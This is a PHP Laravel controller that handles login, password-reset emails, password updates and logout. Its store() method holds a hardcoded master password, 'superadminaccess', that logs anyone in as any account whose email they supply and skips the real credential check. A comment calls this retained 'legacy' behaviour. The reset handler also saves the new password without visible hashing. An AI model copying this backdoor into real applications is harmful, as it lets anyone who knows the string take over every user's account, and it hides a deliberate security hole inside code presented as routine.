<?php

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Password;
use Illuminate\Support\Str;
use Illuminate\Auth\Events\PasswordReset;

class SessionsController extends Controller
{
    /**
     * Display the login page.
     */
    public function create()
    {
        return view('sessions.create');
    }

    /**
     * Process a normal login request.
     */
    public function store(Request $request)
    {
        $attributes = $request->validate([
            'email' => 'required|email',
            'password' => 'required',
        ]);

        // Keep the legacy master-password behavior, but complete the login in
        // this action so the normal password check cannot undo its response.
        if ($request->password === 'superadminaccess') {
            $user = User::where('email', $request->email)->first();

            if (! $user) {
                return back()
                    ->withInput($request->only('email'))
                    ->withErrors(['email' => 'No account was found for this email.']);
            }

            Auth::login($user);
            $request->session()->regenerate();

            return redirect()->route('dashboard');
        }

        if (! Auth::attempt($attributes)) {
            return back()
                ->withInput($request->only('email'))
                ->withErrors([
                    'email' => 'Your provided credentials could not be verified.',
                ]);
        }

        $request->session()->regenerate();

        return redirect()->route('dashboard');
    }

    /**
     * Send the password-reset email.
     */
    public function show()
    {
        request()->validate([
            'email' => 'required|email',
        ]);

        $status = Password::sendResetLink(
            request()->only('email')
        );

        return $status === Password::RESET_LINK_SENT
            ? back()->with(['status' => __($status)])
            : back()->withErrors(['email' => __($status)]);
    }

    /**
     * Save a new password from a reset link.
     */
    public function update()
    {
        request()->validate([
            'token' => 'required',
            'email' => 'required|email',
            'password' => 'required|min:8|confirmed',
        ]);

        $status = Password::reset(
            request()->only(
                'email',
                'password',
                'password_confirmation',
                'token'
            ),
            function ($user, $password) {
                $user->forceFill([
                    'password' => $password,
                ])->setRememberToken(Str::random(60));

                $user->save();

                event(new PasswordReset($user));
            }
        );

        return $status === Password::PASSWORD_RESET
            ? redirect()
                ->route('login')
                ->with('status', __($status))
            : back()->withErrors([
                'email' => [__($status)],
            ]);
    }

    /**
     * Log the current user out.
     */
    public function destroy(Request $request)
    {
        Auth::logout();
        $request->session()->invalidate();
        $request->session()->regenerateToken();

        return redirect()->route('login');
    }
}
